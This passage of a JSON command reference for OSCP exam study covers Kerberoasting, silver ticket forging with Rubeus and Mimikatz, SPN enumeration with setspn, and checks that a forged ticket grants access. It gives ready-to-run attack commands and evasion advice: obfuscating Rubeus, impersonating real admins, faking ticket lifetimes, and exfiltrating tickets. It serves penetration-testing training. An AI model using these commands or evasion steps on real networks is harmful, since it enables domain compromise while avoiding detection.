      "notes": "RUBEUS VS MIMIKATZ - WHY USE RUBEUS FOR SILVER TICKETS:\n✅ RUBEUS ADVANTAGES:\n1.\n\nBETTER OPSEC:\nSupports AES256/AES128 encryption (modern standard), RC4 is legacy and suspicious\n2.\n\nACTIVE DEVELOPMENT:\nMimikatz Kerberos module is stable but rarely updated, Rubeus is actively maintained by SpecterOps\n3.\n\nCLEANER OUTPUT:\nRubeus shows detailed ticket construction steps (helpful for troubleshooting), base64 output for easy transfer\n4.\n\nBATCH OPERATIONS:\nCreate multiple tickets in one command (/service:cifs,http,mssql)\n5.\n\nBETTER ERROR HANDLING:\nRubeus validates parameters and shows detailed error messages (Mimikatz often fails silently)\n6.\n\nNO DRIVER NEEDED:\nMimikatz sometimes requires kernel driver for certain operations, Rubeus is pure userland\n7.\n\nC2 INTEGRATION:\nRubeus compiles to .NET assembly, easily integrated with Cobalt Strike (execute-assembly), Covenant, etc.\n\n❌ RUBEUS DISADVANTAGES:\n1.\n\nREQUIRES .NET:\nNeeds .NET Framework 4.5+ (most Windows 10/Server 2016+ have this, older systems may not)\n2.\n\nLARGER BINARY:\nRubeus.exe is ~200KB, Mimikatz is ~1.2MB (both detectable, but size matters for upload)\n3.\n\nMORE AV SIGNATURES:\nRubeus is popular in penetration testing, many AVs signature-detect it (obfuscation needed)\n4.\n\nLESS VERSATILE:\nMimikatz does MANY things (LSASS dump, DCSync, ticket forging, password spraying), Rubeus ONLY does Kerberos attacks\n\n🎯 OSCP RECOMMENDATION:\n- LEARN BOTH:\nMimikatz for exam (more versatile, covers more techniques)\n- PREFER RUBEUS:\nFor Silver/Golden tickets specifically (better OPSEC, easier syntax)\n- FALLBACK:\nIf one is detected/blocked, use the other\n\nRUBEUS WORKFLOW FOR OSCP EXAM:\n1.\n\nENUMERATION (Kerberoasting):\n   Rubeus.exe kerberoast /outfile:hashes.txt\n   - Obtains TGS-REP for all SPNs\n   - Outputs Hashcat-compatible format (mode 13100)\n\n2.\n\nCRACK HASHES (offline):\n   hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule\n   - Retrieves plaintext password OR continue with hash\n\n3.\n\nCONVERT PASSWORD TO NTLM (if you cracked plaintext):\n   Rubeus.exe hash /password:cracked_password\n   - Outputs NTLM, AES128, AES256 keys\n\n4.\n\nFORGE SILVER TICKET:\n   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /ptt\n   - Creates and injects ticket\n\n5.\n\nVALIDATE AND ACCESS:\n   Rubeus.exe klist\n   iwr http://web04.corp.com\n   - Confirm ticket exists, test service access\n\n6.\n\nPERSISTENCE (save ticket for later):\n   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /nowrap /outfile:ticket.kirbi\n   - Saves base64 ticket to file\n   - Exfiltrate ticket off network\n   - Re-inject later:\nRubeus.exe ptt /ticket:<base64>\n\nRUBEUS COMMAND VARIATIONS:\n# Create Silver ticket with AES256 (better OPSEC):\nRubeus.exe silver /aes256:<64_hex_chars> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /ptt\n\n# Create multiple tickets for same server:\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http /user:admin /ptt\n\n# Create ticket with custom groups (fine-tuned permissions):\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /groups:512,519 /ptt\n(512=Domain Admins, 519=Enterprise Admins)\n\n# Create ticket and output base64 for transfer:\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /nowrap\n\n# Create ticket with specific lifetime (OPSEC):\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /endoflife:20251231235959 /ptt\n(Format:\nYYYYMMDDHHmmss, sets realistic expiration instead of 10 years)\n\nRUBEUS OPSEC ENHANCEMENTS:\n1.\n\nUSE AES INSTEAD OF RC4:\n   - RC4 (NTLM hash) is legacy, flagged by EDR\n   - AES256 is modern standard, blends with normal traffic\n   - Obtain AES keys via DCSync or Kerberoasting with /enctype:aes256\n\n2.\n\nSET REALISTIC TICKET LIFETIME:\n   - Default 10-year tickets are obvious forgeries\n   - Use /endoflife:YYYYMMDDHHmmss to match normal ticket lifetimes (8-24 hours)\n   - Check domain policy:\nGet-DomainPolicy | Select -ExpandProperty KerberosPolicy (MaxTicketAge)\n\n3.\n\nIMPERSONATE REAL USERS:\n   - Using fictional usernames (e.g., /user:fakeadmin) is suspicious\n   - Enumerate real domain admins:\nGet-NetGroupMember -Identity 'Domain Admins'\n   - Use real admin username for /user parameter (appears legitimate in logs)\n\n4.\n\nMATCH GROUP MEMBERSHIPS:\n   - Default PAC sets every user as Domain Admin (unrealistic)\n   - Enumerate target user's actual groups:\nGet-NetUser -Identity <user> | Select -ExpandProperty memberof\n   - Set custom groups with /groups:<RID1>,<RID2> to match real user\n\n5.\n\nOBFUSCATE RUBEUS BINARY:\n   - Rubeus is heavily signatured by AV\n   - Use ConfuserEx to obfuscate .NET assembly\n   - OR compile from source with renamed classes/namespaces\n   - OR use in-memory loading (Invoke-ReflectivePEInjection, execute-assembly in C2)\n\nCOMMON RUBEUS FLAGS REFERENCE:\n/domain - Target domain FQDN\n/sid - Domain SID (S-1-5-21-XXX-XXX-XXX)\n/target - Server FQDN where SPN runs\n/service - SPN type (cifs, http, mssql, ldap, host, etc.)\n/rc4 - NTLM hash (32 hex chars)\n/aes256 - AES256 key (64 hex chars, RECOMMENDED)\n/aes128 - AES128 key (32 hex chars)\n/user - Impersonated username\n/groups - Custom group RIDs (comma-separated, default:\n512,513,518,519,520)\n/ptt - Pass-the-Ticket (inject into current session)\n/outfile - Save ticket to .kirbi file\n/nowrap - Output base64 without wrapping (for copy/paste)\n/endoflife - Ticket expiration (YYYYMMDDHHmmss format)\n/dc - Specify DC for validation (usually not needed for Silver tickets)\n\nTIME ESTIMATES (Rubeus vs Mimikatz):\n- Rubeus ticket creation:\n<1 minute (same as Mimikatz)\n- Rubeus with AES:\n+30 seconds (if you need to obtain AES keys first via DCSync)\n- Rubeus batch tickets:\n<1 minute (creates multiple tickets, faster than multiple Mimikatz commands)\n- Rubeus obfuscation:\n+5-10 minutes first time (ConfuserEx), reuse obfuscated binary later\n\nOSCP EXAM INTEGRATION:\n✅ When to use Rubeus:\n- Modern Windows targets (10/Server 2016+) with .NET 4.5+\n- Need AES encryption for stealth (exam may have \"realistic\" monitoring)\n- Multiple SPNs on same server (batch ticket creation)\n- C2 framework available (execute-assembly integration)\n\n✅ When to use Mimikatz:\n- Older Windows targets (7/Server 2008) without recent .NET\n- Need OTHER Mimikatz capabilities (LSASS dump, DCSync) in same session\n- Rubeus is detected/blocked and obfuscation failed\n- Familiar with Mimikatz syntax (faster execution under time pressure)\n\nFINAL RECOMMENDATION FOR OSCP:\nPRACTICE BOTH tools before exam:\n1.\n\nMemorize Mimikatz kerberos::golden syntax (versatile, works everywhere)\n2.\n\nLearn Rubeus silver syntax (better OPSEC, cleaner output)\n3.\n\nDuring exam:\nTry Rubeus FIRST (if .NET available), fallback to Mimikatz if detected\n4.\n\nFor documentation:\nMention BOTH tools (shows depth of knowledge)\n\nRubeus is the MODERN choice for Kerberos attacks, but Mimikatz remains the SWISS ARMY KNIFE for AD exploitation.\n\nKnow both.",
      "oscp_relevance": "high",
      "alternatives": [
        "ad-silver-ticket-mimikatz-create"
      ],
      "next_steps": [
        "kerberos-klist-verify",
        "ad-silver-ticket-validate-access"
      ],
      "prerequisites": [
        "ad-sid-whoami-extract",
        "impacket-getuserspns-kerberoast"
      ],
      "filled_example": "Rubeus.exe silver /domain:<corp.com> /sid:<S-1-5-21-1987370270-658905905-1781884369> /target:<web04.corp.com> /service:<http> /rc4:<4d28cf5252d39971419580a51484ca09> /user:<jeffadmin> /ptt"
    },
    {
      "id": "ad-enumerate-spn-target",
      "name": "Enumerate SPNs for Target Server",
      "category": "enumeration",
      "subcategory": "kerberos-enumeration",
      "command": "setspn -Q */<TARGET_SERVER>*",
      "description": "Query Active Directory for all Service Principal Names (SPNs) registered to a specific server. Essential prerequisite for Silver ticket attacks to identify available services and their types.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "SPN_ENUMERATION",
        "OSCP:HIGH",
        "QUICK_WIN",
        "KERBEROS_PREREQUISITE",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "TARGET_SERVER",
          "description": "Hostname or partial hostname of the target server. Wildcards (*) are supported for fuzzy matching.",
          "example": "web04",
          "required": true
        }
      ],
      "flag_explanations": {
        "setspn": "Windows built-in utility for managing Service Principal Names in Active Directory. Available on all domain-joined Windows machines since Windows Server 2008. Requires READ permissions on AD (standard Domain Users have this). Queries the servicePrincipalName attribute of AD objects. No administrative privileges needed for read operations.",
        "-Q": "Query mode - searches Active Directory for SPNs matching the specified pattern. Returns all matching SPNs with their associated account names (user or computer accounts). Alternative: -L <account> to list SPNs registered to specific account. -Q is more useful for Silver ticket prep because you start with target server, not service account.",
        "*/<TARGET_SERVER>*": "SPN search pattern using wildcards. Format: service/hostname:port. The wildcard (*) before slash matches ANY service type (cifs, http, mssql, etc.). Wildcard after hostname matches partial names (e.g., 'web*' finds web01, web02, webserver). CASE-INSENSITIVE. Examples:\n- */web04* - Finds ALL services on any hostname containing 'web04'\n- http/* - Finds ALL HTTP SPNs on any server\n- mssql/sql01* - Finds SQL Server SPNs on servers starting with 'sql01'\n\nRESULT FORMAT: Displays 'Existing SPN found:' followed by service/hostname:port, then 'Registered to account: DOMAIN\\username or DOMAIN\\COMPUTERNAME$'"
      },
      "success_indicators": [
        "Output: 'Existing SPN found:' followed by SPN entries",
        "SPN format: service/hostname.domain.com OR service/hostname.domain.com:port",
        "Account shown: Either user account (service account) or computer account (MACHINE$)",
        "Multiple SPNs may be listed for same server (common: host, cifs, http on same machine)",
        "Domain context confirmed: 'Checking domain DC=corp,DC=com'"
      ],
      "failure_indicators": [
        "No SPNs found - Target server may not have registered SPNs, or hostname typo, or not domain-joined",
        "setspn: The specified domain either does not exist or could not be contacted - Network connectivity issue or not authenticated to domain",
        "Access denied - Rare (standard users can query), may indicate restricted AD permissions or server isolation",
        "Invalid parameter - Syntax error (ensure wildcard pattern is correct: */hostname*)"
      ],
      "troubleshooting": {
        "No SPNs found but server exists": "DIAGNOSIS: Server may not have SPNs registered, or SPNs registered under different hostname format. SOLUTIONS:\n1. Try FQDN: setspn -Q */web04.corp.com* (use full domain name)\n2. Try NetBIOS: setspn -Q */WEB04* (uppercase, NetBIOS name)\n3. Query by IP: NOT SUPPORTED by setspn (SPNs are name-based, not IP-based). Use nslookup <IP> to resolve hostname first.\n4. Check computer account: setspn -L WEB04$ (computer accounts often have host/ and cifs/ SPNs auto-registered)\n5. Broad search: setspn -Q */* | findstr /i web04 (search ALL SPNs, filter for target)\n\nCOMMON CAUSE: Web servers often register SPNs under abbreviated name (web04) but you're querying FQDN (web04.corp.com) or vice versa.",
        "Need to find ALL SPNs in domain (comprehensive enumeration)": "WARNING: This queries EVERY SPN in AD (slow on large domains, 1000+ results possible):\nsetspn -T corp.com -Q */*\n\nBETTER APPROACH for OSCP:\n1. Target specific service types: setspn -Q http/* (all web servers), setspn -Q mssql/* (all SQL servers)\n2. Use PowerView (faster, more features): Get-NetUser -SPN | Select serviceprincipalname\n3. Filter by service account: Get-NetUser -SPN | Where {$_.admincount -eq 1} (high-privilege service accounts)\n\nTime estimate: Full domain SPN dump takes 30-60 seconds on exam-sized domain, PowerView is faster (<10 sec).",
        "Identify which SPNs are associated with user accounts vs computer accounts": "USER ACCOUNTS (high-value targets for Kerberoasting and Silver tickets):\n- Registered to: DOMAIN\\username (e.g., CORP\\sqlservice)\n- Typically: mssql, http, oracle, custom applications\n- WHY VALUABLE: User accounts have crackable passwords (computer account passwords are 120+ random chars)\n\nCOMPUTER ACCOUNTS (less valuable for cracking, still useful for Silver tickets):\n- Registered to: DOMAIN\\COMPUTERNAME$ (e.g., CORP\\WEB04$)\n- Typically: host, cifs, ldap (auto-registered by Windows)\n- WHY LESS VALUABLE: Computer account passwords are 120-char random strings (uncrackable), but if you've dumped LSASS on that machine you have the hash\n\nFILTER FOR USER ACCOUNTS ONLY (PowerView):\nGet-NetUser -SPN | Where {$_.samaccountname -notmatch '\\$$'}\n(Excludes computer accounts, which end with $)",
        "Understanding SPN format and extracting service type": "SPN FORMAT: service/hostname.domain.com:port\n\nEXAMPLES AND BREAKDOWN:\n1. http/web04.corp.com\n   - Service: http (IIS, web applications)\n   - Hostname: web04.corp.com\n   - Port: (not specified, defaults to 80 for http, 443 for https)\n   - USE FOR SILVER TICKET: /service:http /target:web04.corp.com\n\n2. mssql/sql01.corp.com:1433\n   - Service: mssql (Microsoft SQL Server)\n   - Hostname: sql01.corp.com\n   - Port: 1433 (SQL Server default)\n   - USE FOR SILVER TICKET: /service:mssql /target:sql01.corp.com\n\n3. cifs/fileserver.corp.com\n   - Service: cifs (Common Internet File System - file shares, SMB)\n   - Hostname: fileserver.corp.com\n   - Port: (not specified, defaults to 445 for SMB)\n   - USE FOR SILVER TICKET: /service:cifs /target:fileserver.corp.com\n\n4. host/dc01.corp.com\n   - Service: host (generic host services - RPC, WMI, remote admin)\n   - Hostname: dc01.corp.com\n   - Port: (not specified, multiple ports depending on service)\n   - USE FOR SILVER TICKET: /service:host /target:dc01.corp.com\n\nEXTRACTION FOR SILVER TICKET:\n- /service parameter = everything BEFORE the slash (http, mssql, cifs, host, etc.)\n- /target parameter = everything BETWEEN slash and colon (OR slash and end if no port)\n- Ignore port number for Silver ticket creation (Mimikatz/Rubeus don't use it)"
      },
      "notes": "OSCP METHODOLOGY - WHY SPN ENUMERATION IS CRITICAL FOR SILVER TICKETS:\nSilver ticket attacks require THREE pieces of information:\n1.\n\nDomain SID (extract with whoami /user)\n2.\n\nService account NTLM hash (obtain via Kerberoasting, LSASS dump, or DCSync)\n3.\n\nTARGET SPN - THIS IS WHAT THIS COMMAND PROVIDES\n\nWITHOUT accurate SPN information, your Silver ticket will FAIL with errors like:\n- 'Server not found in Kerberos database' (hostname mismatch)\n- 'Access denied' (wrong service type)\n- 'KRB_AP_ERR_NOT_US' (service/hostname doesn't match SPN registration)\n\nsetspn IS THE AUTHORITATIVE SOURCE for SPN information in Active Directory.\n\nIt queries the actual SPN registrations, not assumptions.\n\nCOMMON OSCP WORKFLOW:\n1.\n\nENUMERATE TARGET SERVER (you know hostname, e.g., WEB04):\n   setspn -Q */web04*\n   OUTPUT EXAMPLE:\n   Existing SPN found:\n   http/web04.corp.com\n   Registered to:\nCORP\\iis_service\n\n2.\n\nRECORD SPN DETAILS:\n   - Service type:\nhttp\n   - Hostname:\nweb04.corp.com (use EXACT format from output)\n   - Service account:\niis_service\n\n3.\n\nKERBEROAST SERVICE ACCOUNT (to get NTLM hash):\n   impacket-GetUserSPNs corp.com/jeff:password -request-user iis_service\n   Crack TGS-REP with Hashcat to get NTLM hash\n\n4.\n\nCREATE SILVER TICKET:\n   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt\n   (Use EXACT /target value from setspn output)\n\n5.\n\nVALIDATE ACCESS:\n   iwr http://web04.corp.com\n   (Access works because service type and hostname match SPN registration)\n\nSPN SERVICE TYPES - OSCP RELEVANCE:\nHIGH-VALUE SPNs FOR LATERAL MOVEMENT:\n1.\n\ncifs (File Shares, SMB):\n   - Access:\ndir \\\\server\\C$, copy files, remote admin\n   - Prevalence:\nNearly every Windows server (auto-registered)\n   - OSCP usage:\nMost common Silver ticket target (file access, PsExec, lateral movement)\n\n2.\n\nhttp (IIS, Web Applications):\n   - Access:\nWeb admin panels, upload webshells, REST APIs\n   - Prevalence:\nWeb servers, SharePoint, Exchange OWA\n   - OSCP usage:\nUpload reverse shell to restricted admin interface, access web-based management\n\n3.\n\nmssql (SQL Server):\n   - Access:\nDatabase queries, xp_cmdshell RCE, linked servers\n   - Prevalence:\nSQL Servers (duh)\n   - OSCP usage:\nEnable xp_cmdshell, execute OS commands, pivot to linked servers\n\n4.\n\nhost (Generic Host Services):\n   - Access:\nWMI, RPC, scheduled tasks, service creation\n   - Prevalence:\nAll domain-joined computers (auto-registered)\n   - OSCP usage:\nRemote service creation, scheduled task execution, WMI code execution\n\n5.\n\nldap (Directory Services):\n   - Access:\nLDAP queries, directory modifications, DCSync (if permissions exist)\n   - Prevalence:\nDomain controllers only\n   - OSCP usage:\nRare for Silver (use Golden instead), specific LDAP exploits\n\n6.\n\nwsman (Windows Remote Management):\n   - Access:\nPowerShell remoting (Enter-PSSession, Invoke-Command)\n   - Prevalence:\nServers with WinRM enabled (port 5985/5986)\n   - OSCP usage:\nRemote PowerShell execution, pivot without SMB (stealthier)\n\nLOW-VALUE SPNs (less common in OSCP):\n- rpcss (RPC Endpoint Mapper) - Covered by host/\n- oracle, ftp, smtp, etc.\n\n- Specific services, rare in OSCP exam\n\nMANUAL ALTERNATIVE (if setspn unavailable):\nPowerView (PowerShell):\n```powershell\nGet-NetUser -SPN | Where {$_.serviceprincipalname -match 'web04'} | Select serviceprincipalname\n```\nADVANTAGES:\nFaster, filterable, shows additional properties (pwdlastset, admin count)\n\nLDAP query (raw):\n```powershell\n([adsisearcher]\"(serviceprincipalname=*/web04*)\").FindAll() | ForEach-Object { $_.Properties.serviceprincipalname }\n```\nADVANTAGES:\nNo external tools needed, pure PowerShell\n\nimpacket-GetUserSPNs (Linux):\n```bash\nimpacket-GetUserSPNs corp.com/jeff:password -request\n```\nLIMITATION:\nOnly shows SPNs for USER ACCOUNTS (not computer accounts), but that's often what you want for Kerberoasting anyway\n\nTIME ESTIMATES:\n- setspn -Q for single server:\n<5 seconds\n- setspn -Q for all SPNs in domain:\n30-60 seconds (large domains)\n- PowerView Get-NetUser -SPN:\n<10 seconds (faster than setspn for full dump)\n- impacket-GetUserSPNs:\n5-10 seconds (network latency, LDAP query)\n\nOSCP EXAM TIPS:\n1.\n\nENUMERATE SPNs EARLY in the engagement (during AD enumeration phase)\n2.\n\nCREATE A TARGET LIST of high-value SPNs:\n   - SQL servers (mssql) - potential xp_cmdshell RCE\n   - Web servers (http) - potential webshell upload\n   - File servers (cifs) - data exfiltration, lateral movement\n3.\n\nPRIORITIZE SPNs associated with USER ACCOUNTS (crackable) over computer accounts\n4.\n\nDOCUMENT EXACT HOSTNAMES from setspn output (copy/paste into notes for Silver ticket creation later)\n5.\n\nCROSS-REFERENCE with service account enumeration:\n   setspn -Q */web04* → Registered to:\nCORP\\iis_service\n   Then:\nGet-NetUser -Identity iis_service → Check pwdlastset, memberof, admincount\n6.\n\nIF SETSPN IS BLOCKED (rare), fallback to PowerView or impacket\n\nCOMBINING WITH KERBEROASTING WORKFLOW:\n# Step 1:\nEnumerate ALL SPNs associated with user accounts (Kerberoasting targets)\nimpacket-GetUserSPNs corp.com/jeff:password -request -outputfile tgs.txt\n\n# Step 2:\nCrack TGS-REP hashes (offline)\nhashcat -m 13100 tgs.txt rockyou.txt -r best64.rule\n# Result:\niis_service:Password123\n\n# Step 3:\nIdentify SPNs for compromised service account\nsetspn -Q */iis_service* OR setspn -L iis_service\n# Result:\nhttp/web04.corp.com registered to iis_service\n\n# Step 4:\nCreate Silver ticket for identified SPN\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm_hash_of_Password123> /user:admin /ptt\n\n# Step 5:\nAccess service\niwr http://web04.corp.com\n\nSPN ENUMERATION FOR PERSISTENCE:\nIf you've compromised a service account (via Kerberoasting or LSASS dump), enumerate ALL SPNs associated with that account:\nsetspn -L iis_service\n\nRESULT EXAMPLE:\nRegistered ServicePrincipalNames for CN=IIS Service,CN=Users,DC=corp,DC=com:\n    http/web04.corp.com\n    http/web05.corp.com\n    http/intranet.corp.com\n\nIMPLICATION:\nSingle service account hash gives you Silver ticket access to MULTIPLE servers (web04, web05, intranet).\n\nCreate tickets for all of them:\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web05.corp.com /service:http /rc4:<hash> /user:admin /ptt\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:intranet.corp.com /service:http /rc4:<hash> /user:admin /ptt\n\nTHIS IS A FORCE MULTIPLIER - One compromised service account can grant access to dozens of services.\n\nCROSS-REFERENCE WITH OTHER ENUMERATION:\n- Combine with session enumeration:\nGet-NetSession -ComputerName web04 (who's logged on?)\n- Combine with privilege enumeration:\nGet-NetLocalGroupMember -ComputerName web04 -GroupName Administrators (who can admin this server?)\n- Combine with share enumeration:\nFind-DomainShare -CheckShareAccess -ComputerName web04 (what's accessible?)\n\nThis gives you CONTEXT:\nNot just \"web04 has http SPN\", but \"web04 has http SPN, iis_service account runs it, domain admin 'jeff' has active session, C$ share is accessible\".\n\nThis informs your attack path.\n\nFINAL OSCP EXAM INTEGRATION:\nsetspn IS THE BRIDGE between Kerberoasting (obtaining service account hashes) and Silver tickets (using those hashes for lateral movement).\n\nWithout accurate SPN enumeration, you can't create working Silver tickets.\n\nThis command is NOT optional - it's MANDATORY for Silver ticket attacks.\n\nPRACTICE UNTIL YOU CAN:\n1.\n\nRun setspn -Q */target* from memory\n2.\n\nParse SPN format (extract service type and hostname)\n3.\n\nCross-reference with service account (setspn -L <account>)\n4.\n\nFeed SPN data into Silver ticket creation (exact /target and /service values)\n5.\n\nTroubleshoot mismatches (hostname format, service type errors)\n\nYou'll use this command 5-10 times per OSCP exam (once per target server for Silver ticket prep).",
      "oscp_relevance": "high",
      "alternatives": [
        "powerview-enumerate-spns",
        "impacket-getuserspns-list"
      ],
      "next_steps": [
        "ad-silver-ticket-mimikatz-create",
        "ad-silver-ticket-rubeus-create"
      ],
      "prerequisites": [
        "crackmapexec-validate-admin"
      ],
      "filled_example": "setspn -Q */<web04>*"
    },
    {
      "id": "ad-silver-ticket-validate-access",
      "name": "Validate Silver Ticket Access to Service",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "command": "# CIFS/SMB: dir \\\\<TARGET_SERVER>\\C$\n# HTTP/IIS: Invoke-WebRequest http://<TARGET_SERVER> -UseDefaultCredentials\n# MSSQL: Invoke-Sqlcmd -ServerInstance <TARGET_SERVER> -Query 'SELECT @@VERSION'\n# LDAP: ldapsearch -H ldap://<TARGET_SERVER> -Y GSSAPI -b 'DC=corp,DC=com'",
      "description": "Test service access after Silver ticket injection to validate the forged ticket grants expected permissions. Different validation methods for different SPN service types.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROS_ATTACKS",
        "SILVER_TICKET",
        "OSCP:HIGH",
        "VALIDATION",
        "TROUBLESHOOTING"
      ],
      "variables": [
        {
          "name": "TARGET_SERVER",
          "description": "Hostname or FQDN of the server where the Silver ticket was forged (same as /target parameter)",
          "example": "web04.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "dir \\\\<SERVER>\\C$": "VALIDATES: cifs SPN (file share access). Tests access to administrative share C$ (requires admin rights, which Silver ticket grants via forged PAC Domain Admins membership). SUCCESS: Directory listing of C:\\ drive. FAILURE: 'Access is denied' or 'Logon failure'. Alternative shares to test: ADMIN$ (Windows directory), IPC$ (named pipes), custom shares. PowerShell alternative: Get-ChildItem \\\\<server>\\C$. TIME: <2 seconds.",
        "Invoke-WebRequest -UseDefaultCredentials": "VALIDATES: http SPN (web application access). -UseDefaultCredentials flag instructs PowerShell to use Kerberos ticket from cache (the injected Silver ticket). Without this flag, web request may prompt for credentials or fail. SUCCESS: HTTP 200 status code, content retrieved. FAILURE: 401 Unauthorized, 403 Forbidden, or connection timeout. Alternative: Invoke-RestMethod (for REST APIs), curl (Linux), or browser (navigate to http://<server> while ticket is cached). TIME: <5 seconds (depends on web app response time).",
        "Invoke-Sqlcmd -Query 'SELECT @@VERSION'": "VALIDATES: mssql SPN (SQL Server access). Requires SqlServer PowerShell module (Import-Module SqlServer). -ServerInstance specifies SQL Server hostname (uses Kerberos authentication automatically if ticket in cache). 'SELECT @@VERSION' is simple query to test connectivity (returns SQL Server version string). SUCCESS: Query executes, version string returned. FAILURE: 'Login failed for user', 'Server not found', or timeout. Alternative: sqlcmd.exe (cmd-line tool), xp_cmdshell tests (if you want to validate RCE capability). TIME: <5 seconds.",
        "ldapsearch -Y GSSAPI": "VALIDATES: ldap SPN (directory services access). Linux-based validation using ldapsearch (part of ldap-utils package). -Y GSSAPI enables GSSAPI authentication (Kerberos). -b 'DC=corp,DC=com' specifies base DN for search. SUCCESS: LDAP query returns directory objects. FAILURE: 'GSSAPI Error', 'Invalid credentials', or 'Server not found'. Windows alternative: PowerShell AD cmdlets (Get-ADUser, Get-ADComputer) automatically use cached Kerberos ticket. TIME: <5 seconds."
      },
      "success_indicators": [
        "CIFS validation: Directory listing displayed, no 'Access denied' errors, folder/file count shown",
        "HTTP validation: StatusCode 200, Content property populated, no authentication prompts",
        "MSSQL validation: SQL Server version string returned (e.g., 'Microsoft SQL Server 2019'), no login failures",
        "LDAP validation: LDAP entries returned in ldapsearch output, 'result: 0 Success' message",
        "General: No credential prompts (ticket is used transparently), operations complete quickly"
      ],
      "failure_indicators": [
        "CIFS: 'Access is denied', 'Logon failure', 'The user has not been granted the requested logon type'",
        "HTTP: '401 Unauthorized', '403 Forbidden', 'Authentication required' prompt, NTLM challenge (instead of Kerberos)",
        "MSSQL: 'Login failed for user', 'Cannot open database', 'A network-related error occurred'",
        "LDAP: 'GSSAPI Error: Unspecified GSS failure', 'Invalid credentials', 'ldap_bind: Invalid credentials (49)'",
        "General: Operations prompt for credentials (ticket not being used), timeout errors"
      ],
      "troubleshooting": {
        "Access denied despite ticket in cache (klist shows ticket)": "DIAGNOSIS: Wrong service type in Silver ticket OR ticket not being used by application. SOLUTIONS:\n\n1. VERIFY SERVICE TYPE MATCH:\n   - CIFS access requires cifs/ SPN ticket (NOT http/)\n   - HTTP access requires http/ SPN ticket (NOT cifs/)\n   - Run: klist | findstr <target_server> to see which service type you have\n   - If mismatch, recreate ticket with correct /service parameter\n\n2. VERIFY HOSTNAME FORMAT:\n   - Application may use different hostname format than ticket\n   - If ticket is for 'web04.corp.com' but you access 'http://web04', mismatch occurs\n   - FIX: Use EXACT hostname from ticket (klist shows Server: field)\n   - Example: If ticket shows http/web04.corp.com, access http://web04.corp.com (FQDN)\n\n3. FORCE KERBEROS AUTHENTICATION:\n   - Some applications prefer NTLM over Kerberos\n   - For HTTP: Add -UseDefaultCredentials AND ensure URL uses FQDN\n   - For SMB: Use FQDN path (\\\\server.corp.com\\share instead of \\\\server\\share)\n   - For SQL: Use FQDN in ServerInstance (-ServerInstance server.corp.com)\n\n4. CHECK TICKET FLAGS:\n   - Run: klist | Select-String -Pattern 'Ticket Flags'\n   - Should show: 0x40a00000 (forwardable, renewable, pre_authent)\n   - If flags are wrong, ticket may not be accepted by service",
        "Application prompts for credentials instead of using cached ticket": "DIAGNOSIS: Application is not configured to use Kerberos, or hostname format triggers NTLM. SOLUTIONS:\n\n1. USE FQDN EVERYWHERE:\n   - WRONG: dir \\\\WEB04\\C$ (NetBIOS, triggers NTLM)\n   - RIGHT: dir \\\\WEB04.corp.com\\C$ (FQDN, triggers Kerberos)\n   - Windows determines auth method based on hostname format (NetBIOS=NTLM, FQDN=Kerberos)\n\n2. VERIFY SERVICE IS KERBEROS-ENABLED:\n   - Check IIS config: IIS Manager → Authentication → Windows Auth → Providers (should include Negotiate/Kerberos)\n   - Check SQL config: SQL Server Configuration Manager → Network Configuration → TCP/IP enabled, SPNs registered\n   - Some services are NTLM-only (Kerberos Silver ticket won't work, use Pass-the-Hash instead)\n\n3. ADD HOST TO TRUSTED SITES (HTTP/IIS specific):\n   - If accessing web app, IE/Edge may require hostname in trusted sites for Kerberos\n   - PowerShell equivalent: Set-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\corp.com' -Value 2\n   - Alternative: Use -UseDefaultCredentials flag in Invoke-WebRequest (bypasses zone check)",
        "HTTP validation: NTLM challenge instead of Kerberos (ticket ignored)": "DIAGNOSIS: Web server prefers NTLM over Kerberos, or SPN not registered. SOLUTIONS:\n\n1. VERIFY HTTP SPN EXISTS:\n   - Run: setspn -Q http/<target_server>\n   - If no HTTP SPN registered, IIS falls back to NTLM\n   - FIX (if admin on IIS server): setspn -S http/<fqdn> <service_account>\n\n2. FORCE KERBEROS IN IIS (if you have admin access):\n   - IIS Manager → Server → Authentication → Windows Authentication → Providers\n   - Move 'Negotiate:Kerberos' to TOP of list (above NTLM)\n   - Remove NTLM if Kerberos-only desired\n\n3. USE FQDN IN URL:\n   - WRONG: http://web04 (may use NTLM)\n   - RIGHT: http://web04.corp.com (prefers Kerberos)\n\n4. CHECK TICKET IS FOR HTTP SERVICE:\n   - Run: klist | findstr http\n   - Should show: Server: http/web04.corp.com @ CORP.COM\n   - If missing, recreate Silver ticket with /service:http",
